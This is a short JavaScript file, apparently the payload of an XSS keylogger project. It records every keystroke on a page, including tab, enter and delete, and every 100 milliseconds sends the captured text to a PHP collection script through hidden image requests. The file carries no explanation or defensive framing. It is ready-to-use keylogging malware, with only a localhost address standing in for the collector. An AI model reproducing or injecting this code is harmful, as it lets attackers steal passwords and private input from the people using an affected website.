var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}

document.onkeydown=function(){
if(window.event.keyCode == 9){ 
  new Image().src = 'http://localhost:8888/xss/keylogger-master/keylogger.php?c=--tab--';
}
if(window.event.keyCode == 13){ 
  new Image().src = 'http://localhost:8888/xss/keylogger-master/keylogger.php?c=--enter--';
}
if(window.event.keyCode == 46){ 
  new Image().src = 'http://localhost:8888/xss/keylogger-master/keylogger.php?c=--delete--';
}
}

window.setInterval(function(){
if(keys != '') {
  new Image().src = 'http://localhost:8888/xss/keylogger-master/keylogger.php?c='+keys;
  keys = '';
}

}, 100);


